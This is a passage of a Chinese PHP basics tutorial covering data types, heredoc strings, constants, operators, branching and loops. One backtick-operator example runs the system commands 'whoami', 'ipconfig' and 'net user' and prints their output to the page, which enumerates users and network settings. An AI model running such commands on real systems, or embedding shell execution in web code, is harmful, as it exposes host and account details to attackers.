换成布尔类型的值。⼤多数的值是被认为是true，少部分以下值被认为是false。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">float</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>)<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>)<span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">0</span>)&#123;&#125;</span><br><span class="line"><span class="literal">NULL</span></span><br></pre></td></tr></table></figure><h3 id="int"><a href="#int" class="headerlink" title="int"></a>int</h3><p>整型，存储整数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="number">24</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$age</span>);</span><br></pre></td></tr></table></figure><h3 id="float"><a href="#float" class="headerlink" title="float"></a>float</h3><p>浮点型，也称double，指包含⼩数的数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$score</span> = <span class="number">99.9</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$score</span>);</span><br></pre></td></tr></table></figure><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>字符串是有序的⼀系列字符。字符串可以使⽤单引号、双引号、定界符三种⽅法来定 义。 </p><p>单引号定义字符串： 单引号定义的字符串中不能包含单引号，如果包含，需要转义<code>\&#39;</code> 。 单引号中的变量不会被识别。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// string.php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;XIU&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;Welcome, &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>.<span class="variable">$name</span>; <span class="comment">// . 运算符，在PHP 中代表字符串拼接。</span></span><br></pre></td></tr></table></figure><p>双引号定义字符串： 双引号中可以包含单引号，双引号中包含双引号，需要转义 <code>\&quot;</code> 。 PHP 会解析双引号之间的变量，最好⽤ <code>&#123;&#125;</code> 将变量名括起来。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// string.php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="variable">$message</span> = <span class="string">&quot;Welcome, <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$message</span>;</span><br></pre></td></tr></table></figure><p>定界符定义字符串：当需要定义输出⼤段字符串时，并且该字符串中有超多特殊字符，包括单引号，双引号等 等。 定界符定义的字符串中的单双引号，还有⼤部分特殊字符不需要进⾏转义。 定界符开始标识符 <code>&lt;&lt;&lt; + 标志</code> ，标志建议⼤写字⺟，并且具备⼀定的语义。 定界符结束标⽰符 <code>标志 + ;</code> ，结束标识符之后，只能有换⾏回⻋。 标志的命名规则，字⺟、数字、下划线，并且不能以数字开始。 定界符中的 <code>$</code> 同样会识别成变量，变量名要⽤ <code>&#123;&#125;</code> 括起来。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// string.php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&lt;&lt;&lt;XIU</span></span><br><span class="line"><span class="string">&lt;h1&gt;My Name is &lt;span style = &quot;color:pink&quot;&gt;<span class="subst">&#123;$name&#125;</span>&lt;/span&gt;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">console.log(&#x27;This message is from info.php!&#x27;)</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">XIU</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br></pre></td></tr></table></figure><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>常量是⼀个简单值的标⽰符，如其名称所暗⽰的。在PHP 脚本执⾏期间⼀个常量⼀旦 被定义，就不能被改变或者取消定义，常量的作⽤域是全局，常量包含bool，int， float，string 类型的数据。</p><h3 id="定义和使⽤"><a href="#定义和使⽤" class="headerlink" title="定义和使⽤"></a>定义和使⽤</h3><p>常量的命名与变量类似，也遵循PHP 标识符的名称规则，按照惯例常量标识符总是⼤ 写的。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// define.php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;USERNAME&quot;</span>, <span class="string">&quot;XIU&quot;</span>);</span><br><span class="line"><span class="comment">// USERNAME = &#x27;XIU&#x27;;</span></span><br><span class="line"><span class="comment">// unset(&quot;USERNAME&quot;);</span></span><br><span class="line"><span class="keyword">echo</span> USERNAME;</span><br></pre></td></tr></table></figure><p>变量⼀般由$ 符号起头，常量⼀般⼤写。</p><h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p>PHP 已经定义好了，可以直接使⽤的常量，⼀般代表特殊的含义。魔术常量是预定义 常量中⽐较特殊的⼀类。</p><table><thead><tr><th align="center">常量名</th><th align="center">常量值</th></tr></thead><tbody><tr><td align="center">FILE</td><td align="center">当前的⽂件名，完整的路径。</td></tr><tr><td align="center">LINE</td><td align="center">当前⾏号</td></tr><tr><td align="center">FUNCTION</td><td align="center">当前的函数名</td></tr><tr><td align="center">CLASS</td><td align="center">当前的类名</td></tr><tr><td align="center">METHOD</td><td align="center">当前对象的⽅法名</td></tr><tr><td align="center">PHP_OS</td><td align="center">操作系统类型</td></tr><tr><td align="center">PHP_VERSION</td><td align="center">当前PHP 的版本</td></tr><tr><td align="center">DIRECTORY_SEPARATOR</td><td align="center">⽬录的分隔符</td></tr></tbody></table><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th align="center">例子</th><th align="center">名称</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">-$a</td><td align="center">取反</td><td align="center">$a 的负值</td></tr><tr><td align="center">$a + $b</td><td align="center">加法</td><td align="center">$a和$b 的和</td></tr><tr><td align="center">$a - $b</td><td align="center">减法</td><td align="center">$a 和$b 的差</td></tr><tr><td align="center">$a * $b</td><td align="center">乘法</td><td align="center">$a 和$b 的积</td></tr><tr><td align="center">$a &#x2F; $b</td><td align="center">除法</td><td align="center">$a 除以$b 的商</td></tr><tr><td align="center">$a % $b</td><td align="center">取模，取余</td><td align="center">$a 除以$b 的余数</td></tr><tr><td align="center">++ $a</td><td align="center">前加</td><td align="center">$a 的值加⼀，然后返回$</td></tr><tr><td align="center">$a++</td><td align="center">后加</td><td align="center">返回$a，然后将$a 的值加⼀</td></tr><tr><td align="center">–$a</td><td align="center">前减</td><td align="center">$a 的值减⼀， 然后返回$a</td></tr><tr><td align="center">$a–</td><td align="center">后减</td><td align="center">返回$a，然后将$a 的值减⼀</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset = <span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;算术运算符&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// echo -$a;</span></span><br><span class="line"><span class="comment">// echo $a + $b;</span></span><br><span class="line"><span class="comment">// echo $a - $b;</span></span><br><span class="line"><span class="comment">// echo $a * $b;</span></span><br><span class="line"><span class="comment">// echo $a / $b;</span></span><br><span class="line"><span class="comment">// echo $a % $b;</span></span><br><span class="line"><span class="comment">// echo ++ $a;</span></span><br><span class="line"><span class="comment">// echo $a ++;</span></span><br><span class="line"><span class="comment">// echo -- $a;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>--;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>字符串运算符完成的主要⼯作，就是字符串拼接。 在JS 语⾔中，字符串拼接⽤+，运算符. 的作⽤是访问对象中的属性或者⽅法。 PHP 中，使⽤ <code>.</code> 进⾏字符串拼接。PHP 中 <code>.</code> 也叫连接运算符。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset = <span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;字符串连接符&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello,&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line"><span class="comment">//$str = &quot;Hello,&quot;+$name;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>左边的操作数必须是变量，右边可以是⼀个表达式，也可以是⼀个值，⼀个变量等 等。 </p><p>作⽤：将右边表达式的值赋给左边变量。</p><blockquote><p><strong>⼆元赋值运算符</strong>:</p><p>&#x3D;</p><p>+&#x3D;</p><p>-&#x3D;</p><p>*&#x3D;</p><p>&#x2F;&#x3D;</p><p>%&#x3D;</p><p>.&#x3D;</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset = <span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;赋值运算符&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// $a += $b;</span></span><br><span class="line"><span class="comment">// $a -= $b;</span></span><br><span class="line"><span class="comment">// $a *= $b;</span></span><br><span class="line"><span class="comment">// $a /= $b;</span></span><br><span class="line"><span class="comment">// $a %= $b;</span></span><br><span class="line"><span class="variable">$a</span> .= <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h3 id="⽐较运算符"><a href="#⽐较运算符" class="headerlink" title="⽐较运算符"></a>⽐较运算符</h3><p>对操作数（按照⽐较运算符的要求,规则）进⾏⽐较后，得到返回值（boolean）。 </p><p>如果⽐较出的结果满⾜⽐较运算符的要求那么结果就是true（真，成⽴，满⾜），否 则就是false （假，不成⽴，不满⾜）。</p><table><thead><tr><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">$a &#x3D;&#x3D; $b</td><td align="center">等于</td></tr><tr><td align="center">$a &#x3D;&#x3D;&#x3D; $b</td><td align="center">全等</td></tr><tr><td align="center">$a !&#x3D; $b</td><td align="center">不等</td></tr><tr><td align="center">$a &lt;&gt; $b</td><td align="center">不等</td></tr><tr><td align="center">$a !&#x3D;&#x3D; $b</td><td align="center">不全等</td></tr><tr><td align="center">$a &lt; $b</td><td align="center">小于</td></tr><tr><td align="center">$a &gt; $b</td><td align="center">⼤于</td></tr><tr><td align="center">$a &lt;&#x3D; $b</td><td align="center">⼩于等于</td></tr><tr><td align="center">$a &gt;&#x3D; $b</td><td align="center">⼤于等于</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset = <span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;比较运算符&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">3</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> == <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> === <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> != <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> &lt;&gt; <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> !== <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> &gt; <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> &gt;= <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> &lt; <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> &lt;= <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PHP 中规定：使⽤echo 输出布尔类型值的时候 <code>echo true</code> ; 它在⻚⾯中会输出 1。 <code>echo false</code> ; 它会在⻚⾯中什么都不输出。建议使⽤var_dump() 来输出更明 了的结果。</p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th align="center">逻辑运算符</th><th align="center">例⼦</th><th align="center">解释</th><th>运算符法则</th></tr></thead><tbody><tr><td align="center">and &amp;&amp;</td><td align="center">$a and $b $a &amp;&amp; $b</td><td align="center">逻辑”与”运算</td><td></td></tr><tr><td align="center">or ||</td><td align="center">$a or $b $a || $b</td><td align="center">逻辑”或”运算</td><td></td></tr><tr><td align="center">xor</td><td align="center">$a xor $b</td><td align="center">逻辑”异或”运算</td><td>相同为假，不同为真。</td></tr><tr><td align="center">!</td><td align="center">!$a</td><td align="center">逻辑”⾮”运算</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset = <span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;逻辑运算符&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//var_dump($a);</span></span><br><span class="line"><span class="comment">//var_dump($b);</span></span><br><span class="line"><span class="variable">$c</span> = (<span class="variable">$a</span> <span class="keyword">and</span> <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = (<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = (<span class="variable">$a</span> <span class="keyword">or</span> <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = (<span class="variable">$a</span> || <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = (<span class="variable">$a</span> <span class="keyword">xor</span> <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = !<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><p><strong>?:</strong> </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">20</span>;</span><br><span class="line"><span class="variable">$max</span> = <span class="variable">$a</span> &gt; <span class="variable">$b</span> ? <span class="variable">$a</span> : <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$max</span>;</span><br></pre></td></tr></table></figure><p><strong>反引号</strong></p><p>​⾃动适配系统命令，调⽤系统命令。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ``.php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;ipconfig&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;net user&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>.`<span class="variable">$cmd</span>`;</span><br></pre></td></tr></table></figure><p><strong>@</strong></p><p>​屏蔽表达式可能发⽣的错误。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> @<span class="variable">$username</span>;</span><br></pre></td></tr></table></figure><h1 id="PHP-流程控制"><a href="#PHP-流程控制" class="headerlink" title="PHP 流程控制"></a>PHP 流程控制</h1><h3 id="顺序执⾏"><a href="#顺序执⾏" class="headerlink" title="顺序执⾏"></a>顺序执⾏</h3><p>⾃上⽽下的执⾏即可，这也是PHP 语句的默认执⾏过程。对这个执⾏过程没有控制。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is first echo&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is second echo&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is third echo&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="分⽀执⾏"><a href="#分⽀执⾏" class="headerlink" title="分⽀执⾏"></a>分⽀执⾏</h3><p>分⽀执⾏可以根据表达式的值是否为True 来选择执⾏某些代码，PHP 的分⽀执⾏主 要通过if 和switch 来实现。</p><h3 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h3><p><strong>语⾔结构</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>()&#123;<span class="comment">//判断条件，如果判断条件的返回值为True，则执行语句块1，否则执行语句块2</span></span><br><span class="line"><span class="comment">//语句块1</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//语句块2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>单向条件：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if.php</span></span><br><span class="line"><span class="variable">$score</span> = <span class="number">59.9</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$score</span> &gt;= <span class="number">60</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;congratulations&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>双向条件：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if.php</span></span><br><span class="line"><span class="variable">$score</span> = <span class="number">99.9</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$score</span> &gt;= <span class="number">60</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;congratulations&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, you may need help!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a>switch 语句</h3><p>功能与if 语句类似，当需要多向分⽀结构时，并且判断条件是具体的某个值，此时⼤ 多使⽤switch 结构。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$day</span> = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$day</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Monday&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Tuesday&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Wednesday&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Thursday&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Friday&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Saturday!&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sunday!&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>注意： 表达式的值最好是整形或者字符串。 不要忘记break 语句，⽤来跳出switch 语句。每个case 语句后⾯都加上break。 如果某个case 语句后⾯并没有接语句块，那么就说明这个语句块的内容是同下。 case 后⾯的语句块是不需要 <code>&#123;&#125;</code> 括起来的。</p><h3 id="判断条件"><a href="#判断条件" class="headerlink" title="判断条件"></a>判断条件</h3><p>在编写if 语句时，要求判断条件是⼀个布尔类型的值。但是实际应⽤中，是⽆法保障 这⼀点。如果判断条件是⾮布尔类型的值，就需要强制转换成布尔类型的值。如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if.php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="number">0.0</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$flag</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="number">24</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="number">59.9</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$flag</span>).<span class="string">&quot; means Ture&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$flag</span>).<span class="string">&quot; means False&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="循环执⾏"><a href="#循环执⾏" class="headerlink" title="循环执⾏"></a>循环执⾏</h1><p>计算机最擅⻓的功能之⼀就是按照规定的条件，重复执⾏某些操作，这是程序设计中 最能发挥计算机特⻓的程序结构。</p><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p><strong>语⾔结构</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(表达式)&#123;<span class="comment">//当表达式的值为真的时候，执行循环体。</span></span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当表达式的值为true，就执⾏下⾯的循环体。当循环体执⾏结束之后，继续判断表达 式的值是true 还是false，如果还是true，那么就继续执⾏循环体。直到，这个表达式 的值为false，那么这个while 语句就执⾏结束了。</p><p> 例⼦：输出1 到100 数字。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// while.php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$a</span> &lt;= <span class="number">100</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do-while.php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> ++;</span><br><span class="line">&#125;<span class="keyword">while</span> (<span class="variable">$a</span> &lt;= <span class="number">10</span>);</span><br></pre></td></tr></table></figure><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p><strong>语法格式。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;<span class="comment">//计数器;判断条件;自增或自减</span></span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例⼦：输出1 到1000 数字。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// for.php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">1000</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="特殊流程"><a href="#特殊流程" class="headerlink" title="特殊流程"></a>特殊流程</h1><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>break ⽤于switch，for，while，do…while，foreach 等的中断。后⾯可以接上⼀个 数字来表⽰跳出⼏层循环。默认不加就是跳出当前循环语句。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// break.php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$i</span> % <span class="number">17</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP is DONE!&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><p>continue 只能⽤在循环语句，轮空本次循环，并不是结束整个循环语句。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// continue.php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$i</span> % <span class="number">17</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP is DONE!&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h3><p>exit 表⽰结束当前整个PHP 脚本的执⾏。同die() 语句。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// exit.php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$i</span> % <span class="number">17</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// exit;</span></span><br><span class="line"><span class="comment">// exit(&quot;PHP is OVER&quot;);</span></span><br><span class="line"><span class="comment">// die(&quot;PHP is OVER&quot;);</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP is DONE!&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
